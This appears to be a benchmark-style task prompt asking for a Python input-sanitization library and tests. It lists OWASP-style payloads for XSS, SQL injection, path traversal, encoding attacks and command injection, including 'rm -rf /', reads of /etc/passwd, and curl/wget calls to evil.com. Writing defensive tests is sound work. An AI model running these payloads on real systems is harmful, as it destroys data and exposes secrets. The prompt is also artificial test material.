# Input Sanitization

**Category:** Security
**Target:** Edge cases, encoding attacks, injection vectors, validation

---

## Prompt

Build a Python input validation and sanitization library that handles the following attack vectors. For each category, provide both the sanitizer and a test that demonstrates the attack and the fix.

**Structure:**

```
inputguard/
├── src/inputguard/
│   ├── __init__.py
│   ├── html.py            # XSS prevention, HTML sanitization
│   ├── sql.py             # SQL injection prevention
│   ├── path.py            # Path traversal prevention
│   ├── command.py         # Command injection prevention
│   ├── encoding.py        # Encoding attacks (UTF-7, double encoding, Unicode normalization)
│   ├── email.py           # Email validation (with edge cases)
│   ├── url.py             # URL validation (SSRF prevention)
│   └── json.py            # JSON depth/size limits, prototype pollution
├── tests/
│   ├── test_html.py
│   ├── test_sql.py
│   ├── test_path.py
│   ├── test_command.py
│   ├── test_encoding.py
│   ├── test_email.py
│   ├── test_url.py
│   └── test_json.py
├── pyproject.toml
└── README.md
```

**Attack vectors to handle:**

### HTML/XSS
- `<script>alert(1)</script>` — basic script injection
- `<img src=x onerror=alert(1)>` — event handler injection
- `<svg/onload=alert(1)>` — SVG injection
- `javascript:alert(1)` — protocol handler
- `<iframe src="data:text/html,<script>alert(1)</script>">` — data URI
- `&#x61;lert(1)` — HTML entity encoding

### SQL Injection
- `' OR '1'='1` — basic OR injection
- `' UNION SELECT password FROM users--` — UNION injection
- `1; DROP TABLE users--` — stacked queries
- `' AND (SELECT COUNT(*) FROM users) > 0--` — boolean-based blind
- `1' WAITFOR DELAY '00:00:05'--` — time-based blind (SQL Server)

### Path Traversal
- `../../../etc/passwd` — basic traversal
- `..%2f..%2f..%2fetc%2fpasswd` — URL-encoded
- `....//....//etc/passwd` — filter bypass (double dot-slash)
- `..\..\windows\system32\config\sam` — Windows paths
- `/proc/self/environ` — Linux proc access

### Command Injection
- `; rm -rf /` — command separator
- `$(cat /etc/passwd)` — command substitution
- `` `whoami` `` — backtick execution
- `| curl evil.com` — pipe injection
- `&& wget evil.com/shell.sh` — AND chaining

### Encoding Attacks
- UTF-7 encoded payloads: `+ADw-script-AD4-alert(1)-ADw-/script-AD4-`
- Double URL encoding: `%2527%2520OR%25201%253D1`
- Unicode normalization: `ﬃle.txt` → `file.txt` (confusable characters)
- Null byte injection: `shell.php%00.jpg`

**Requirements:**

- Each module provides `sanitize(input) -> safe_output` and `validate(input) -> bool`
- HTML sanitizer allows a configurable whitelist of tags/attributes
- SQL module provides parameterized query builder (not just string escaping)
- Path sanitizer resolves to a safe base directory (prevents escape)
- Command sanitizer provides a safe subprocess wrapper with argument list (no shell=True)
- Encoding module normalizes to NFC and rejects known attack patterns
- URL validator blocks internal IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
- JSON parser enforces max depth (default 20) and max size (default 1MB)
- Comprehensive tests with real attack payloads from OWASP

**Constraints:**

- Python 3.10+, stdlib only (no bleach, no lxml)
- All tests must pass with `pytest -v`
- Each test file must include both attack payloads and legitimate inputs

Produce all files with complete working code. No placeholders, no TODOs.
